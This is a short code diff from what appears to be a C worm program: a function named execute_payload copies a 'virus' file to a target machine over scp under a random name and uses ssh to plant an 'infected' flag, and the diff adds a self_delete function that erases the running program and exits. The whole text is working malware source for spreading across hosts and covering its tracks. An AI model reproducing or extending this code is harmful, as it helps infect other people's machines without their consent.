@@ -93,9 +93,14 @@ void execute_payload(char *virus_name, char *target_ip_buff) {
     generate_random_string(rnd_name_buffer);
     snprintf(cmd_buffer, sizeof(cmd_buffer), "scp %s debian@%s:%s/%s", virus_name, target_ip_buff, VIRUS_WOKRING_DIR, rnd_name_buffer);
     system(cmd_buffer);
-
+    // add infected flag
     snprintf(cmd_buffer, sizeof(cmd_buffer), "ssh debian@%s touch %s/%s", target_ip_buff, VIRUS_WOKRING_DIR, INFECTED_FLAG);
     system(cmd_buffer);
+}
+
+void self_delete(char *program_name) {
+    remove(program_name);
+    exit(EXIT_SUCCESS);
 }
 
 int main(int argc, char **argv) {
